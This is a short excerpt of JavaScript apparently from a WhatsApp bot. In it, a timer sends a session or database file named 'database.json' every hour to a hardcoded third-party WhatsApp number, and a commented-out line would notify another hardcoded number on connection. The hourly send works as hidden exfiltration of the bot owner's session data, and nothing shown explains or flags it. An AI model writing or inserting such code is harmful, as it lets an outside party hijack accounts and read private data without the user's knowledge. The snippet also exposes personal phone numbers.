...
setInterval(async () => {
    ...
    return await conn.sendMessage('6285692195658@s.whatsapp.net', { document: sesi, mimetype: 'application/json', fileName: 'database.json' }, { quoted: q })
  }, 60 * 60 * 1000)
...
async function connectionUpdate(update) {
 ...
 // if (update.receivedPendingNotifications) conn.sendMessage(`628238992403@s.whatsapp.net`, {text: 'Berhasil tersambung dengan itsukaBotz' }) itsuka Store
}
